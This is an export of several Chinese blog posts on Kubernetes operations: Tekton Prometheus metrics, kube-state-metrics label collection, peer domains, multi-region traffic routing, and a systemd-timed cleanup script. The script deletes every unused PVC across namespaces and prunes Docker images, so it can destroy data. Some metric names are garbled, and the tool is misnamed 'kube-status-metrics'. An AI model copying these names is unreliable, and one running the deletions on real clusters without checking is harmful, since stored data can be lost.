tekton_pipelines_controller_pipelinerun_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, status=\u0026ldquo;success\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 7540\n在整个集群上，流水线总共成功执行了 7540 次\n2.4 tekton_pipelines_controller_running_pipelineruns_count tekton_pipelines_controller_running_pipelineruns_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 1\n在整个集群上，正在运行 1 条流水线\n2.5 tekton_pipelines_controller_taskrun_duration_seconds_[bucket, sum, count] 如果直接使用 taskrun 而不是 pipelinerun 运行任务，才会有这些指标。\n2.6 tekton_pipelines_controller_taskrun_count tekton_pipelines_controller_taskrun_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, status=\u0026ldquo;success\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 43423\n在整个集群上，taskrun 成功执行了 43423 次\n2.7 tekton_pipelines_controller_running_taskruns_count tekton_pipelines_controller_running_taskruns_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 1\n在整个集群上，正在运行 1 个 taskrun 任务\n2.8 tekton_pipelines_controller_taskruns_pod_latency tekton_pipelines_controller_taskruns_pod_latency{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;asimov\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pod=\u0026ldquo;p-caa3ljeb23td2d6v8t7g-fetch-main-repo-fr62k-pod-sh4vp\u0026rdquo;, task=\u0026ldquo;git-clone\u0026rdquo;, taskrun=\u0026ldquo;p-caa3ljeb23td2d6v8t7g-fetch-main-repo-fr62k\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 3000000000\np-caa3ljeb23td2d6v8t7g-fetch-main-repo-fr62k taskrun 任务创建 Pod 的启动延时为 3000000000，这里的延时是秒级别，因此单位应该是纳秒，也就是 3 秒。\ntekton_pipelines_controller_cloudevent_count tekton_pipelines_controller_cloudevent_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;account\u0026rdquo;, pipeline=\u0026ldquo;pay-c9tn0h6b23t28qjnp5mg\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;pay-c9tno3mb23t28qjnp660\u0026rdquo;, status=\u0026ldquo;failed\u0026rdquo;, task=\u0026ldquo;approve\u0026rdquo;, taskrun=\u0026ldquo;pay-c9tno3mb23t28qjnp660-approve-huawei-pzwzg\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 0\nTekton 可以与 CloudEvent 集成，将事件发送到 CloudEvent 进行广播。\n2.9 tekton_pipelines_controller_client_latency_[bucket, sum, count] Tekton 中使用 Client 与 Kubernete Apiserver 交互。\ntekton_pipelines_controller_client_latency_bucket{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, le=\u0026ldquo;1\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 11627\nle=\u0026ldquo;0.1\u0026rdquo; 10019，在 0.1 秒内，处理了 10019 个请求\nle=\u0026ldquo;1\u0026rdquo; 11627，在 1 秒内，处理了 11627 个请求\nle=\u0026ldquo;10\u0026rdquo;，在 10 秒内，处理了 11633 个请求\n其他相关的指标还有:\ntekton_pipelines_controller_client_latency_sum\ntekton_pipelines_controller_client_latency_count\n3. Grafana 面板 针对上面的一些描述，我绘制了一个 Tekton Overview 的 Grafana 面板，链接: https://grafana.com/grafana/dashboards/16559-tekton-overview\n下面是一些面板截图:\n如果你也需要使用这个面板，别忘了开启 Label 的采集，参考: 如何采集 Kubernetes 对象的 labels 和 annotations。\n4. 参考 https://tekton.dev/docs/pipelines/metrics/ https://ish-ar.io/tekton-and-prometheus/ https://github.com/tektoncd/pipeline/blob/main/docs/metrics.md https://grafana.com/grafana/dashboards/16559-tekton-overview ","description":"","id":158,"section":"post","tags":["博文","Kubernetes","Tekton","监控","指标"],"title":"如何查看 Tekton 的流水线指标","uri":"https://www.chenshaowen.com/blog/how-to-insight-the-pipeline-of-tekton.html"},{"content":"1. 为什么需要 kube-status-metrics Kubernetes 的监控主要关注两类指标:\n基础性能指标 CPU、内存、磁盘、网络等指标，可以通过 DaemonSet 部署 node-exporter，由 Prometheus 抓取相关指标。\n资源对象指标 Deployment 的副本数量、Pod 的运行状态等。这些指标需要 kube-status-metrics 轮询 Kubernetes 的 API 查询，并暴露给 Prometheus 才能够看到。\n2. kube-status-metrics 默认提供了哪些指标 指标类别包括:\nCertificateSigningRequest Metrics\nConfigMap Metrics\nCronJob Metrics\nDaemonSet Metrics\nDeployment Metrics\nEndpoint Metrics\nHorizontal Pod Autoscaler Metrics\nIngress Metrics\nJob Metrics\nLease Metrics\nLimitRange Metrics\nMutatingWebhookConfiguration Metrics\nNamespace Metrics\nNetworkPolicy Metrics\nNode Metrics\nPersistentVolume Metrics\nPersistentVolumeClaim Metrics\nPod Disruption Budget Metrics\nPod Metrics\nReplicaSet Metrics\nReplicationController Metrics\nResourceQuota Metrics\nSecret Metrics\nService Metrics\nStatefulSet Metrics\nStorageClass Metrics\nValidatingWebhookConfiguration Metrics\nVerticalPodAutoscaler Metrics\nVolumeAttachment Metrics\n以 Pod 为例：\nkube_pod_annotations\nkube_pod_info\nkube_pod_ips\nkube_pod_start_time\nkube_pod_completion_time\nkube_pod_owner\nkube_pod_labels\nkube_pod_nodeselectors\nkube_pod_status_phase\nkube_pod_status_ready\nkube_pod_status_scheduled\nkube_pod_containeHnfo\nkube_pod_container_status_waiting\nkube_pod_container_status_waiting_reason\nkube_pod_container_status_running\nkube_pod_container_state_started\nkube_pod_container_status_terminated\nkube_pod_container_status_terminated_reason\nkube_pod_container_status_last_terminated_reason\nkube_pod_container_status_ready\nkube_pod_container_status_restarts_total\nkube_pod_container_resource_requests\nkube_pod_container_resource_limits\nkube_pod_overhead_cpu_cores\nkube_pod_overhead_memory_bytes\nkube_pod_runtimeclass_name_info\nkube_pod_created\nkube_pod_deletion_timestamp\nkube_pod_restart_policy\nkube_pod_init_container_info\nkube_pod_init_container_status_waiting\nkube_pod_init_container_status_waiting_reason\nkube_pod_init_container_status_running\nkube_pod_init_container_status_terminated\nkube_pod_init_container_status_terminated_reason\nkube_pod_init_container_status_last_terminated_reason\nkube_pod_init_container_status_ready\nkube_pod_init_container_status_restarts_total\nkube_pod_init_containerLresource_limits\nkube_pod_init_container^resource_requests\nkube_pod_spec_volumes_persistentvolumeclaims_info\nkube_pod_spec_volumes_persistentvolumeclaims_readonly\nkube_pod_status_reason\nkube_pod_status_scheduled_time\nkube_pod_status_unschedulable\n相关的指标非常丰富，基本能够观测 Kubernetes 的运行状态。\n3. 如何抓取 label、annotations 默认情况下，kube_pod_labels 和 kube_pod_annotations 指标仅包含名称和命名空间标签。\n如果需要监控更多 labels 和 annotations，就需要用到 kube-status-metrics 的两个启动参数 --metric-labels-allowlist 和 --metric-annotations-allowlist。\n需要注意的是，低版本的 kube-status-metrics 并不完全支持这两个参数，下面的配置中使用的是 2.4.2 版本。\n1 2 3 4 5 6 7 8 containers: - args: - --port=8080 - --metric-labels-allowlist=pods=[*] - --metric-annotations-allowlist=pods=[*] - --resources=certificatesigningrequests,configmaps,cronjobs,daemonsets,deployments,endpoints,horizontalpodautoscalers,ingresses,jobs,limitranges,mutatingwebhookconfigurations,namespaces,networkpolicies,nodes,persistentvolumeclaims,persistentvolumes,poddisruptionbudgets,pods,replicasets,replicationcontrollers,resourcequotas,secrets,services,statefulsets,storageclasses,validatingwebhookconfigurations,volumeattachments - --telemetry-port=8081 image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.4.2 准备一个 Pod 作为观测目标 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 kubectl -n tekton-pipelines get pod tekton-pipelines-controller-6f449d874b-mc7nl -o yaml apiVersion: v1 kind: Pod metadata: annotations: cluster-autoscaler.kubernetes.io/safe-to-evict: \u0026#34;false\u0026#34; cni.projectcalico.org/containerID: 8a505a530b501ad80ce471e86b553257e4ec3541313bc4245233f60a04dd3619 cni.projectcalico.org/podIP: 10.233.105.3/32 cni.projectcalico.org/podIPs: 10.233.105.3/32 creationTimestamp: \u0026#34;2022-04-06T01:44:20Z\u0026#34; generateName: tekton-pipelines-controller-6f449d874b- labels: app: tekton-pipelines-controller app.kubernetes.io/component: controller app.kubernetes.io/instance: default app.kubernetes.io/name: controller app.kubernetes.io/part-of: tekton-pipelines app.kubernetes.io/version: v0.24.1 pipeline.tekton.dev/release: v0.24.1 pod-template-hash: 6f449d874b version: v0.24.1 name: tekton-pipelines-controller-6f449d874b-mc7nl 观测 kube_pod_labels 开启 kube-status-metrics 开关之前\nkube_pod_labels{app_kubernetes_io_component=\u0026ldquo;metrics\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;prometheus\u0026rdquo;, app_kubernetes_io_managed_by=\u0026ldquo;Helm\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;2.3.0\u0026rdquo;, exported_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, helm_sh_chart=\u0026ldquo;kube-state-metrics-4.4.3\u0026rdquo;, instance=\u0026ldquo;10.233.96.11:8080\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, namespace=\u0026ldquo;monitor\u0026rdquo;, node=\u0026ldquo;node2\u0026rdquo;, pod=\u0026ldquo;tekton-pipelines-controller-6f449d874b-mc7nl\u0026rdquo;, service=\u0026ldquo;prometheus-kube-state-metrics\u0026rdquo;, uid=\u0026ldquo;412f8383-1c5c-4f61-8198-453bdb204911\u0026rdquo;}\n开启 kube-status-metrics 开关之后\nkube_pod_labels{app_kubernetes_io_component=\u0026ldquo;metrics\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;prometheus\u0026rdquo;, app_kubernetes_io_managed_by=\u0026ldquo;Helm\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;2.3.0\u0026rdquo;, exported_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, helm_sh_chart=\u0026ldquo;kube-state-metrics-4.4.3\u0026rdquo;, instance=\u0026ldquo;10.233.105.11:8080\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, label_app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, label_app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, label_app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, label_app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, label_app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, label_app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, label_pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, label_pod_template_hash=\u0026ldquo;6f449d874b\u0026rdquo;, label_version=\u0026ldquo;v0.24.1\u0026rdquo;, namespace=\u0026ldquo;monitor\u0026rdquo;, node=\u0026ldquo;node4\u0026rdquo;, pod=\u0026ldquo;tekton-pipelines-controller-6f449d874b-mc7nl\u0026rdquo;, service=\u0026ldquo;prometheus-kube-state-metrics\u0026rdquo;, uid=\u0026ldquo;412f8383-1c5c-4f61-8198-453bdb204911\u0026rdquo;}\n会增加很多 label_ 开头的标签。\nkube_pod_annotations 开启 kube-status-metrics 开关之前\nkube_pod_annotations{app_kubernetes_io_component=\u0026ldquo;metrics\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;prometheus\u0026rdquo;, app_kubernetes_io_managed_by=\u0026ldquo;Helm\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;2.3.0\u0026rdquo;, exported_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, helm_sh_chart=\u0026ldquo;kube-state-metrics-4.4.3\u0026rdquo;, instance=\u0026ldquo;10.233.96.11:8080\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, namespace=\u0026ldquo;monitor\u0026rdquo;, node=\u0026ldquo;node2\u0026rdquo;, pod=\u0026ldquo;tekton-pipelines-controller-6f449d874b-mc7nl\u0026rdquo;, service=\u0026ldquo;prometheus-kube-state-metrics\u0026rdquo;, uid=\u0026ldquo;412f8383-1c5c-4f61-8198-453bdb204911\u0026rdquo;}\n开启 kube-status-metrics 开关之后\nkube_pod_annotations{annotation_cluster_autoscaler_kubernetes_io_safe_to_evict=\u0026ldquo;false\u0026rdquo;, annotation_cni_projectcalico_org_container_id=\u0026ldquo;8a505a530b501ad80ce471e86b553257e4ec3541313bc4245233f60a04dd3619\u0026rdquo;, annotation_cni_projectcalico_org_pod_ip=\u0026ldquo;10.233.105.3/32\u0026rdquo;, annotation_cni_projectcalico_org_pod_ips=\u0026ldquo;10.233.105.3/32\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;metrics\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;prometheus\u0026rdquo;, app_kubernetes_io_managed_by=\u0026ldquo;Helm\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;kube-state-metrics\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;2.3.0\u0026rdquo;, exported_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, helm_sh_chart=\u0026ldquo;kube-state-metrics-4.4.3\u0026rdquo;, instance=\u0026ldquo;10.233.105.11:8080\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, namespace=\u0026ldquo;monitor\u0026rdquo;, node=\u0026ldquo;node4\u0026rdquo;, pod=\u0026ldquo;tekton-pipelines-controller-6f449d874b-mc7nl\u0026rdquo;, service=\u0026ldquo;prometheus-kube-state-metrics\u0026rdquo;, uid=\u0026ldquo;412f8383-1c5c-4f61-8198-453bdb204911\u0026rdquo;}\n会增加很多 annotation_ 开头的标签。\n开启这两个开关之后，对 Prometheus 的内存、CPU、存储都会增加压力。\n在我测试的环境下，集群中有 2000 个，其中仅 40 个处于 Running 状态，全部采集时 Prometheus 的内存消耗瞬间就增加了大约 400 MB，如下图:\nPod 的状态不影响 kube-status-metrics 对其指标的采集。\n4. 参考 https://github.com/kubernetes/kube-state-metrics/tree/master/docs https://github.com/kubernetes/kube-state-metrics/blob/master/docs/pod-metrics.md https://github.com/kubernetes/kube-state-metrics/blob/master/docs/cli-arguments.md ","description":"","id":159,"section":"post","tags":["博文","Kubernetes","监控","指标","采集"],"title":"如何采集 Kubernetes 对象的 labels 和 annotations","uri":"https://www.chenshaowen.com/blog/how-to-collect-labels-and-annotations-of-kubernetes-objects.html"},{"content":"\n1. 含义 如果一个服务有多个域名入口，通过这些入口访问得到的内容一样，那么称这些域名为等价域名。\n比如，通过等价域名，可以提供 3 个一模一样的文件或者接口服务。\nhttps://server.chenshaowen.com/static/index.html https://server-peer-a.chenshaowen.com/static/index.html https://server-peer-b.chenshaowen.com/static/index.html 2. 用途 2.1 增加浏览器并发上限 浏览器通常会限制对单个域名最大并发数量不超过 6 个/秒。通过等价域名，能够显著提高浏览器对服务的并发能力上限。\n2.2 就近接入 这与任播技术类似，但是任播依赖于云厂商的专线，等价域名提供的是自建的任播。\n2.3 方便排查故障 通过等价域名，可以轻松测试任意路线，而不用借助于服务内部的流量染色。\n2.4 规避风险 除了使用 server-peer-a.chenshaowen.com、server-peer-b.chenshaowen.com 作为 server.chenshaowen.com 的等价域名，还可以使用 a.com、b.com 作为一组等价域名。当 a.com 因为各种原因被屏蔽时，可以切换到 b.com 继续使用。\n","description":"","id":160,"section":"post","tags":["博文","域名","架构","海外","路由"],"title":"等价域名","uri":"https://www.chenshaowen.com/blog/peer-domain.html"},{"content":"1. 关于流量分发 流量的治理分为南北向和东西向。在典型的 Network Diagrams 的绘图习惯中，核心网络组件绘制在顶部，客户端绘制在底部，不同的服务水平绘制，因此有了南北和东西流量的称呼。\n其中，南北流量指的是从客户端发起的流量，东西流量指的是服务与服务之间的流量。目前东西流量，采用的是给每个服务添加一个 Sidecar 接管所有服务与服务之间的调用，以达到流量治理的目的。而本篇，主要讨论的是南北向流量，也就是网关流量。\n2. LB 直接路由到服务主机 如上图，对于小规模的业务，我们可以直接通过云厂的 LB，将客户端的流量直接路由到服务，服务再去 DB 获取数据。这就是一个三层架构，接入层 LB，服务层 Server，存储层 DB。\n接入层能承载的流量通常很大，如果需要扩展，可以根据业务进行水平拆分，比如 a.chenshaowen.com 一个 LB、b.chenshaowen.com 一个 LB。\n服务层无状态，通过增加副本数即可实现扩展，无论是加 VM，还是增加 Kubernetes Pod 数量都能较快实现。\nDB 层通常最容易遇到瓶颈，也是较难扩展的部分。在业务瓶颈期，通过配置更好的硬件、性能更好的数据库能短期解决问题。但如果想长期解决问题，还是得进行拆分。DB 的拆分有两种，水平拆分和垂直拆分。水平拆分就是将一个表分成多个表，一个库分成多个库，分散压力。针对国内的用户体量，有些用户信息库甚至能拆分为上百个表，在访问时，根据用户 ID 规则能够找到所在的数据库。而垂直拆分是对表的列进行拆分，减少单表的列数、减少单库的表数。\n3. 国内多机房下的流量分发 如上图，业务规模持续增长时，我们不得不在多个机房部署服务，一方面是提高服务的可用性，一方面是提高对云厂商的议价能力。\n在进行多机房部署之前，建议先做单元化。单元化的过程是有意义的，会帮助我们梳理服务的全部依赖，打包到一个 Unit。无论是单机房多 Unit，还是多机房多 Unit，都可以通过部署新的 Unit 增加可用的副本、实现无缝滚动更新、支持流量灰度等功能。\n在多机房下，用户流量通过接入层 LB，按照比例分配到不同的 Unit 中，再经过 Unit 中的业务网关分发到具体服务。\n这里最大的挑战在于，如何保障 DB 存储层的一致性。我们可以直接购买云厂的异地多活 DB 实例，当然也可以自建异地多活 DB 实例。很多异地多活的 DB 实例方案对时延要求比较高。同一个多活实例中，各个实例之间物理距离可能达到数百公里，这在普通公网条件下是无法达到低延时要求的。因此，异地多活的关键在于，需要搭建一个互通的低延时专线连通各个机房。\n采用不同厂商的机房构建基础设施，还有一个好处就是各厂商都会提供一定的优惠折扣，技术支持上也会积极很多。当然，这也需要消费额达到一定的量级。\n4. 海外多区下的流量策略 海外多区的架构比国内多机房的架构更加复杂。这是由于，各地区有数据保护条例，不允许当地的用户数据外传到其他地方。另一方面，还会涉及到域名策略，是选择海外使用同一个域名、还是海外各区使用不同域名?\n4.1 各区统一域名 通过 cookies 路由各区 如上图，我们可以在 cookies 中，设置 region 字段表示用户所在区域。\n在登录之前，我们需要在各区之间同步用户所在区域的信息。在登录时，通过 DNS 就近解析，或者 LB 任意选择一个区域进行登录。登录之后，在 Cookies 中设置 region 字段。\n登录完成之后，LB 通过 cookies 中的 region 将用户访问请求分发到数据所在区域。\n通过 url 路由各区 与采用 cookies 路由的方式非常类似，我们还可以将 region 信息直接显示的写到 url 中，将 /sg/* 的请求分发到新加坡，将 /us/* 的请求分发的到美西。\n4.2 各区不同域名 如上图，采用多域名在用户可用性、可维护性上会更好。在每个区，我们都为服务提供一个单独的域名 sg.chenshaowen.com 指向新加坡的服务，us.chenshaowen.com 指向美西的服务。\n在登录之前，通过 GeoDNS 地理位置域名解析服务，就近访问所在区域的服务。如果用户属于当区，则完成登录，并跳转到区域域名。否则通过后台转发到其他区域，进行登录，再跳转到用户区域的服务域名。\n5. 总结 本文主要讨论的是南北向的流量分发，从经典的三层架构到多机房，最后到海外各区。\n对于大型服务，单元化无疑可以提高整体的扩展性，借助于流量网关的分发，可以实现故障切换、灰度测试等功能。而对于海外业务，则首先需要考虑的是域名策略。\n实际上，从 SEO 的角度考虑，采用单域名比多域名好很多，多域名会分散网站的权重。但是采用多域名也能有效的分担风险，各区的服务相互不影响，能够独立对外提供访问。如果想结合起来，也可以使用一个统一网关利用 cookies 或 url 转发到各区子域名，比如 chenshaowen.com/sg/ 转发到 sg.chenshaowen.com。\n","description":"","id":161,"section":"post","tags":["博文","海外","流量","网关"],"title":"海外多区下的流量分发","uri":"https://www.chenshaowen.com/blog/traffic-distribution-cross-multi-region.html"},{"content":"1. 准备定时脚步 如果是 Bash 脚本，第一行需要指定解释器。\n1 2 mkdir -p /root/scripts vim /root/scripts/quick-clear.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/bin/sh /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pods --all-namespaces -o wide | grep Evicted | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pod -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pods --all-namespaces -o wide | grep Error | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pod -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pods --all-namespaces -o wide | grep Completed | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pod -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pipelinerun --all-namespaces -o wide | grep Succeeded | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pipelinerun -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pipelinerun --all-namespaces -o wide | grep PipelineRunTimeout | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pipelinerun -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pipelinerun --all-namespaces -o wide | grep InvalidWorkspaceBindings | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pipelinerun -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config get pipelinerun --all-namespaces -o wide | grep Failed | awk \u0026#39;{print $1,$2}\u0026#39; | xargs --no-run-if-empty -L1 /usr/local/bin/kubectl --kubeconfig /root/.kube/config delete pipelinerun -n || true /usr/local/bin/kubectl --kubeconfig /root/.kube/config describe -A pvc | grep -E \u0026#34;^Name:.*$|^Namespace:.*$|^Used By:.*$\u0026#34; | grep -B 2 \u0026#34;\u0026lt;none\u0026gt;\u0026#34; | grep -E \u0026#34;^Name:.*$|^Namespace:.*$\u0026#34; | cut -f2 -d: | paste -d \u0026#34; \u0026#34; - - | xargs --no-run-if-empty -n2 bash -c \u0026#39;/usr/local/bin/kubectl --kubeconfig /root/.kube/config -n ${1} delete pvc ${0}\u0026#39; || true /usr/bin/docker images | grep none | awk \u0026#39;{print $3}\u0026#39; | xargs --no-run-if-empty /usr/bin/docker rmi || true /usr/bin/docker images |grep -E \u0026#34;([0-9a-z]+[-]){3,}[0-9]{9}\u0026#34; |awk \u0026#39;{print $3}\u0026#39; | xargs --no-run-if-empty /usr/bin/docker rmi || true /usr/bin/docker system prune -f || true 别忘了添加可执行权限。\n1 chmod +x /root/scripts/quick-clear.sh 2. 添加 timer 1 vim /etc/systemd/system/quick-clear.timer [Unit] Description=clear every week [Timer] OnCalendar=*-*-* 5:00:00 Unit=quick-clear.service [Install] WantedBy=timers.target 在 [Timer] 中可以使用各种参数控制定时任务的执行周期：\nOnActiveSec，定时器生效后，多少时间开始执行任务 OnBootSec，系统启动后，多少时间开始执行任务 OnStartupSec，Systemd 进程启动后，多少时间开始执行任务 OnUnitActiveSec，该单元上次执行后，等多少时间再次执行 OnUnitInactiveSec，定时器上次关闭后多少时间，再次执行 OnCalendar，基于绝对时间，而不是相对时间执行 AccuracySec，如果因为各种原因，任务必须推迟执行，推迟的最大秒数，默认是60秒 3. 添加 service 1 vim /etc/systemd/system/quick-clear.service [Unit] Description=clear every week Conflicts= quick-clear.timer [Service] ExecStart=/root/scripts/quick-clear.sh 4. 管理定时任务 加载配置 1 